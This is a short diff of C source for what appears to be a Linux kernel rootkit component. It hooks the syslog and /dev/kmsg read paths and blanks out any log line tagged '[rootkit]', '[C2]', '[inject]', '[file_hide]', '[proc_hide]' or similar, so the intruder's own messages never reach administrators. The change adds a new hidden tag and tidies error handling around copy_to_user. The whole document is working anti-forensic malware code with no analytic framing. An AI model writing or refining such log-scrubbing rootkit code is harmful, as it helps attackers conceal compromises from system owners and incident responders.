@@ -17,7 +17,7 @@
 
 static const char *blacklist[] = {
 	"[rootkit]", "[C2]", "[inject]",
-	"[file_hide]", "[proc_hide]", "[log_sanitize]",
+	"[file_hide]", "[proc_hide]", "[log_sanitize]","[symlink-block]" ,
 	"vuln_rw:",
 };
 
@@ -91,8 +91,13 @@ static int syslog_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 		}
 	}
 
-	copy_to_user(data->buf, kbuf, total);
+	if (copy_to_user(data->buf, kbuf, total)) {
+		kfree(kbuf);
+		return 0;
+	}
+	
 	regs->regs[0] = total;
+
 	kfree(kbuf);
 	return 0;
 }
@@ -152,7 +157,8 @@ static int devkmsg_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 	for (i = 0; i < ARRAY_SIZE(blacklist); i++) {
 		if (strnstr(semi, blacklist[i], msglen)) {
 			memset(semi, ' ', msglen);
-			copy_to_user(data->buf, kbuf, total);
+			if (copy_to_user(data->buf, kbuf, total))
+				goto out;
 			break;
 		}
 	}
